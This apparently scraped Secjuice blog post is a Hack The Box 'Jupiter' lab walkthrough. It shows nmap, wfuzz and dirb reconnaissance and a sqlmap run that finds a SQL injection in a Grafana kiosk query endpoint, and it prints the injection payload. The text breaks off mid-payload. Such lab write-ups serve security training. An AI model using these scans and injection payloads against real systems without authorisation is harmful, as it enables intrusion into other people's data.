---
title: HTB Jupiter Walkthrough
url: https://www.secjuice.com/htb-jupiter-walkthrough/
source: Over Security - Cybersecurity news aggregator
date: 2024-09-03
fetch_date: 2025-10-06T18:27:15.637126
---

# HTB Jupiter Walkthrough

[![Secjuice](https://www.secjuice.com/content/images/2018/12/Logo-1.png)](https://www.secjuice.com)

* [Donate](https://opencollective.com/secjuice)
* [About Us](https://secjuice.com/about-us/)
* [Technical](https://secjuice.com/tag/technical/)
* [OSINT](https://secjuice.com/tag/OSINT/)
* [Unusual Journeys](https://secjuice.com/tag/unusual-journeys-into-infosec/)
* [HoF](https://secjuice.com/secjuice-hall-of-fame/)
* [Write With Us](https://secjuice.com/join-secjuice-writing-team/)
* [Hire A Writer](https://secjuice.com/hire-infosec-cybersecurity-writer/)
* [Rankings](https://secjuice.com/secjuice-writers-ranking/)

[Sign in](#/portal/signin)
[Subscribe](#/portal/signup)

# HTB Jupiter Walkthrough

Discover how temporary files can provide information for getting access to a Jupyter notebook.

* [![Andy74](/content/images/size/w100/2020/01/avatar.png)](/author/andy74/)

#### [Andy74](/author/andy74/)

Sep 2, 2024
• 37 min read

![HTB Jupiter Walkthrough](/content/images/size/w2000/2024/09/secjuice-labor-day05.png)

This image was generated using Microsoft Copilot.

A really interesting BOX, one of those that I really like, with a small reverse engineering session in the second part where the resolution can take place in a double mode (but where I don't like easy things and therefore I opted for the more impervious). Let's not get lost in chat and let's get started.

The **nmap** scan.

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-11 12:13 CEST
Nmap scan report for 10.10.11.216
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA)
|_  256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://jupiter.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.62 seconds
```

Again, a standard BOX. Let's insert the domain **jupiter.htb** into the **/etc/hosts** file.
Wow... nice portal. I see different photos in the team but they always show the same name, "**Amanda Stone**", let's keep this information in mind. In the other browsable pages, apart from the contact page which shows the support email (**[[email protected]](/cdn-cgi/l/email-protection)**), I can't find anything particularly interesting, even the contact form seems fake. Ok, let's move on to a little more invasive analysis with a **wfuzz** session, searching for subdomains.

```
┌──(in7rud3r㉿in7rud3r-kali)-[~/Dropbox/hackthebox/_10.10.11.216 - Jupiter (lin)]
└─$ wfuzz -c -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt -u http://jupiter.htb -H "Host:FUZZ.jupiter.htb" --hc 301
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://jupiter.htb/
Total requests: 5000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000001960:   200        211 L    798 W      34390 Ch    "kiosk"
000002700:   400        7 L      12 W       166 Ch      "m."
000002795:   400        7 L      12 W       166 Ch      "ns2.cl.bellsouth.net."
000002885:   400        7 L      12 W       166 Ch      "ns2.viviotech.net."
000002883:   400        7 L      12 W       166 Ch      "ns1.viviotech.net."
000003050:   400        7 L      12 W       166 Ch      "ns3.cl.bellsouth.net."
000004082:   400        7 L      12 W       166 Ch      "jordan.fortwayne.com."
000004081:   400        7 L      12 W       166 Ch      "ferrari.fortwayne.com."
000004083:   400        7 L      12 W       166 Ch      "quatro.oweb.com."

Total time: 56.56239
Processed Requests: 5000
Filtered Requests: 4991
Requests/sec.: 88.39795
```

Ok, interesting, let me to run also a **dirb** session for hidden subfolders on the original portal, in the meantime I'll check the new portal, after I put the domain into the **/etc/hosts** file.

On the second domain a **grafana** dashboard is present and on the login page I can find the exact version.

![](https://www.secjuice.com/content/images/2023/08/img-00-2.png)

So, I can search for the exact exploit. In the meantime, the **dirb** session is finished.

```
┌──(in7rud3r㉿in7rud3r-kali)-[~/Dropbox/hackthebox/_10.10.11.216 - Jupiter (lin)]
└─$ dirb http://jupiter.htb/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Fri Aug 11 12:27:53 2023
URL_BASE: http://jupiter.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://jupiter.htb/ ----
==> DIRECTORY: http://jupiter.htb/css/
==> DIRECTORY: http://jupiter.htb/fonts/
==> DIRECTORY: http://jupiter.htb/img/
+ http://jupiter.htb/index.html (CODE:200|SIZE:19680)
==> DIRECTORY: http://jupiter.htb/js/
[...]
```

Nothing seems to come out. Back to the exploit search, I find a couple of **CVEs** for the specific version of **grafana** (**CVE-2023-2801, CVE-2023-2183**), unfortunately, I can't find any examples of the exploits. Browsing the domain, however, I realize that there is a redirect to a different routing, so I check with **BurpSuite** which redirects are made and I find something interesting.

![](https://www.secjuice.com/content/images/2023/08/img-01-2.png)![](https://www.secjuice.com/content/images/2023/08/img-02-2.png)

Let's see if **sqlmap** makes our life easier and gives us some insight into possible injections.

```
┌──(in7rud3r㉿in7rud3r-kali)-[~/Dropbox/hackthebox/_10.10.11.216 - Jupiter (lin)]
└─$ sqlmap --wizard
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.7#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:41:24 /2023-08-11/

[21:41:24] [INFO] starting wizard interface
Please enter full target URL (-u): http://kiosk.jupiter.htb/api/ds/query
POST data (--data) [Enter for None]: {"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"select \n  count(parent) \nfrom \n  moons \nwhere \n  parent = 'Saturn';","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":940}],"range":{"from":"2023-08-11T13:36:58.932Z","to":"2023-08-11T19:36:58.932Z","raw":{"from":"now-6h","to":"now"}},"from":"1691761018932","to":"1691782618932"}
Injection difficulty (--level/--risk). Please choose:
[1] Normal (default)
[2] Medium
[3] Hard
>
Enumeration (--banner/--current-user/etc). Please choose:
[1] Basic (default)
[2] Intermediate
[3] All
>

sqlmap is running, please wait..

sqlmap identified the following injection point(s) with a total of 260 HTTP(s) requests:
---
Parameter: JSON rawSql ((custom) POST)
    Type: inline query
    Title: Generic inline queries
    Payload: {"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"(SELECT CONCAT(CONCAT('qjxjq',(CASE WHEN (1937=1937) THEN '1' ELSE '0' END)),'qjbbq'))","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":940}],"range":{"from":"2023-08-11T13:36:58.932Z","to":"2023-08-11T1...